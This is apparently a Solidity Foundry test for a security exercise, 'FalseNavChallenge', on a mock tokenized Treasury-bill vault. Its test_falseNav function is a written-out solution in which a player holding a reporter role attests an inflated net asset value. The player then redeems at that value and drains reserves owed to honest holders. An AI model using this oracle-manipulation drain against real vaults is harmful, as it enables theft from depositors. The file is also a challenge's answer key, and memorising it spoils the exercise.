// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {MockUSDC} from "../../src/MockUSDC.sol";
import {ComplianceRegistry} from "../../src/ComplianceRegistry.sol";
import {TBillToken} from "../../src/TBillToken.sol";
import {TBillVault} from "../../src/TBillVault.sol";
import {MockPriceFeed} from "../../src/exercises/MockPriceFeed.sol";
import {MockTBillCustodian} from "../../src/exercises/MockTBillCustodian.sol";
import {RedemptionQueue} from "../../src/exercises/RedemptionQueue.sol";

contract FalseNavChallenge is Test {
    MockUSDC internal usdc;
    ComplianceRegistry internal compliance;
    MockPriceFeed internal feed;
    TBillToken internal tBill;
    MockTBillCustodian internal custodian;
    TBillVault internal vault;
    RedemptionQueue internal queue;
    address internal admin = address(this);
    address internal alice = makeAddr("alice");
    address internal player = makeAddr("player");
    uint256 internal constant PAR = 1e8;
    uint256 internal constant INITIAL_PLAYER_BALANCE = 1_000e6;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() public {
        usdc = new MockUSDC();
        compliance = new ComplianceRegistry(admin);
        feed = new MockPriceFeed(int256(PAR));
        tBill = new TBillToken(admin, compliance);
        custodian = new MockTBillCustodian(admin);
        vault = new TBillVault(usdc, tBill, feed, custodian, admin);
        queue = new RedemptionQueue(vault, tBill, usdc, admin);
        tBill.grantRole(tBill.MINTER_ROLE(), address(vault));
        tBill.grantRole(tBill.MINTER_ROLE(), address(queue));
        custodian.grantRole(custodian.CUSTODIAN_ROLE(), address(vault));
        vault.setQueue(address(queue));
        compliance.setWhitelisted(address(queue), true);
        compliance.setWhitelisted(alice, true);
        compliance.setWhitelisted(player, true);
        vault.grantRole(vault.REPORTER_ROLE(), player);
        queue.grantRole(queue.SETTLER_ROLE(), player);
        usdc.faucet(alice, 1_000e6);
        vm.startPrank(alice);
        usdc.approve(address(vault), 1_000e6);
        vault.subscribe(1_000e6);
        vm.stopPrank();
        usdc.faucet(player, INITIAL_PLAYER_BALANCE);
    }

    function test_assertInitialState() public {
        assertEq(vault.navPerShare(), PAR);
        assertEq(tBill.balanceOf(alice), 1_000e18);
        assertEq(usdc.balanceOf(player), INITIAL_PLAYER_BALANCE);
        assertEq(vault.reserveBalance(), 1_000e6);
        vm.expectRevert();
        vm.prank(alice);
        vault.attest(int256(2e8));
    }

    /// @notice Attest after subscribing at par; lock a fabricated payout and drain reserves.
    function test_falseNav() public checkSolvedByPlayer {
        usdc.approve(address(vault), 100e6);
        vault.subscribe(100e6);
        // Only shares that were honestly bought at $1 are required for the next step.
        vault.attest(5e8);
        tBill.approve(address(queue), 100e18);
        uint256 ticket = queue.enqueue(100e18);
        assertEq(ticket, 0);
        RedemptionQueue.Request memory request = queue.requestAt(ticket);
        assertEq(request.assetsLocked, 500e6);
        assertEq(queue.settle(500e6), 500e6);
        assertEq(queue.claim(), 500e6);
        assertEq(usdc.balanceOf(player), 1_400e6);
    }

    function _isSolved() private {
        assertGt(usdc.balanceOf(player), INITIAL_PLAYER_BALANCE, "player must profit");
        assertLt(
            vault.reserveBalance() + usdc.balanceOf(address(queue)),
            vault.totalClaimValue(),
            "honest holders short"
        );
    }
}
